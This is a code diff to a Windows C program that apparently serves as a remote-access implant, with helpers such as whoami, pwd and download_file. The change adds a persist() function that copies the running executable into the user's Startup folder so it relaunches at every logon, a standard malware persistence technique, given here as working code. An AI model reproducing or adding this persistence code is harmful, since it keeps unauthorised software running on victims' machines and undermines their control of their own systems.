@@ -21,7 +21,6 @@ void whoami(LPWSTR buffer, INT size_buffer) {
         StringCbCatW(buffer, size_buffer, L"<failed>");
     }
     StringCbCatW(buffer, size_buffer, L"\n");
-    //printf("*%S*\n",buffer);
 }
 
 void pwd(LPWSTR buffer, INT size_buffer) {
@@ -124,5 +123,41 @@ INT download_file(PWSTR filename, INT (*input_stream)(PSTR buffer, INT size_buff
     return 0;
 }
 
+INT persist() {
+    WCHAR file_path[MAX_PATH] = L"\0";
+    WCHAR file_name[MAX_PATH] = L"\0";
+    WCHAR startup_file[MAX_PATH] = L"\0";
+    PWSTR startup_path = NULL;
 
+    if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &startup_path) != S_OK) {
+        Debug(printf("Getting startup folder path error.");)
+        return -1;
+    }
+
+    if (GetModuleFileNameW(NULL, file_path, MAX_PATH) == 0) {
+        Debug(printf("Getting module name error.\n");)
+        return -1;
+    }
+
+
+    if (GetFileTitleW(file_path, file_name, MAX_PATH) != 0) {
+        Debug(printf("Getting file name error.\n");)
+        return -1;
+    }
+
+    StringCbCatW(startup_file, sizeof(startup_file), startup_path);      
+    StringCbCatW(startup_file, sizeof(startup_file), L"\\");   
+    StringCbCatW(startup_file, sizeof(startup_file), file_name);
+
+    if (PathFileExistsW(startup_file)) {
+        return 0;
+    }
+
+    if (CopyFileW(file_path, startup_file, TRUE) == 0) {
+        Debug(printf("Copying failed\n");)
+        return -1;
+    }
+
+    return 0;
+}
 
